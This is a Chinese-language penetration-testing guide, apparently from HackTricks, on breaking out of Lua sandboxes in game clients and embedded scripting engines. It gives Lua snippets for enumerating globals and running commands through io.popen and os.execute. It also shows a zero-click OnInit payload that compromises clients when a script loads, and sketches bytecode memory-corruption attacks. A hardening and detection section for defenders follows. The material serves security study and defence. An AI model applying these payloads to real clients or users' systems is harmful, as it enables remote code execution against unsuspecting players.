# 绕过 Lua sandboxes（嵌入式 VM、游戏客户端）

{{#include ../../../banners/hacktricks-training.md}}

本页面汇集了用于枚举和突破嵌入在应用程序中的 Lua“sandboxes”的实用技术（尤其是游戏客户端、plugins 或应用内 scripting engines）。许多 engines 会暴露受限的 Lua 环境，但仍会留下可访问的强大 globals，从而实现任意命令执行；当 bytecode loaders 被暴露时，甚至可能造成 native memory corruption。

关键思路：
- 将 VM 视为未知环境：枚举 _G，发现可访问的危险 primitives。
- 当 stdout/print 被阻止时，滥用 VM 内的 UI/IPC channel 作为 output sink，以观察结果。
- 如果 io/os 被暴露，通常可以直接执行命令（io.popen、os.execute）。
- 如果 load/loadstring/loadfile 被暴露，执行构造的 Lua bytecode 可能会在某些版本中破坏 memory safety（≤5.1 的 verifiers 可以被绕过；5.2 移除了 verifier），从而实现 advanced exploitation。

## 枚举 sandboxed environment

- Dump global environment，以清点可访问的 tables/functions：
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- 如果没有可用的 print()，可以重新利用 VM 内的通信通道。以下示例来自一个 MMO 房屋脚本 VM：只有在调用 sound 后，聊天输出才会生效；下面的代码构建了一个可靠的输出函数：<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
针对你的目标泛化此模式：任何接受字符串的 textbox、toast、logger 或 UI callback 都可以作为 reconnaissance 的 stdout。

## 如果暴露了 io/os，则直接执行 command

如果 sandbox 仍然暴露标准库 io 或 os，你很可能可以立即执行 command：
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
注意：

- 执行发生在 client process 内部；许多会阻止 external debugger 的 anti-cheat/antidebug 层并不能阻止在 VM 内创建进程。
- 另请检查：package.loadlib（任意 DLL/.so 加载）、使用 native modules 的 require、LuaJIT 的 ffi（如果存在），以及 debug library（可在 VM 内提升权限）。

## 通过 auto-run callbacks 实现 Zero-click triggers

如果 host application 将脚本推送到 clients，并且 VM 暴露了 auto-run hooks（例如 OnInit/OnLoad/OnEnter），请将 payload 放置在那里，以便脚本加载后立即实施 drive-by compromise：<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
任何等效的 callback（OnLoad、OnEnter 等）都能在 scripts 自动传输并在 client 上执行时泛化此 technique。

## Recon 期间需要寻找的危险 primitives

在枚举 _G 时，重点查找：
- io、os：io.popen、os.execute、file I/O、env access。
- load、loadstring、loadfile、dofile：执行 source 或 bytecode；支持加载不受信任的 bytecode。
- package、package.loadlib、require：dynamic library loading 和 module surface。
- debug：setfenv/getfenv（≤5.1）、getupvalue/setupvalue、getinfo 以及 hooks。
- 仅限 LuaJIT：ffi.cdef、ffi.load，可直接调用 native code。

最小使用示例（如果可达）：
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## 可选提权：滥用 Lua bytecode loaders

当 `load`/`loadstring`/`loadfile` 可访问，但 `io`/`os` 受到限制时，执行经过构造的 Lua bytecode 可能导致内存泄露和内存破坏原语。关键事实：
- Lua ≤ 5.1 自带 bytecode verifier，但存在已知的绕过方式。<sup>[[4]](#references)</sup>
- Lua 5.2 完全移除了 verifier（官方立场是应用程序应直接拒绝预编译 chunk）；如果未禁止加载 bytecode，攻击面会因此扩大。<sup>[[2]](#references)[[3]](#references)</sup>
- 通常的流程是：通过 VM 内输出泄露指针，构造 bytecode 以制造类型混淆（例如围绕 FORLOOP 或其他 opcode），然后转向任意读写或 native code execution。<sup>[[2]](#references)[[4]](#references)</sup>

此路径与 engine/version 密切相关，并且需要 RE。有关深入分析、利用原语以及游戏中的示例 gadgetry，请参阅 references。

## 检测与加固说明（面向防御者）

- Server side：拒绝或重写 user scripts；对安全 API 使用 allowlist；移除或绑定为空的 `io`、`os`、`load`/`loadstring`/`loadfile`/`dofile`、`package.loadlib`、`debug`、`ffi`。
- Client side：使用最小化的 `_ENV` 运行 Lua，禁止加载 bytecode，重新引入严格的 bytecode verifier 或签名检查，并阻止 client process 创建进程。
- Telemetry：监控 gameclient → child process 的创建事件，尤其是发生在 script load 后不久的情况；将其与 UI/chat/script 事件进行关联。

## References

- [1] [这栋房子闹鬼：AION client 中持续十年的 RCE（housing Lua VM）](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown：解析 Factorio 的 Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l（2009）：关于移除 bytecode verifier 的讨论](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode（包含 verifier bypasses/notes 的 gist）](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
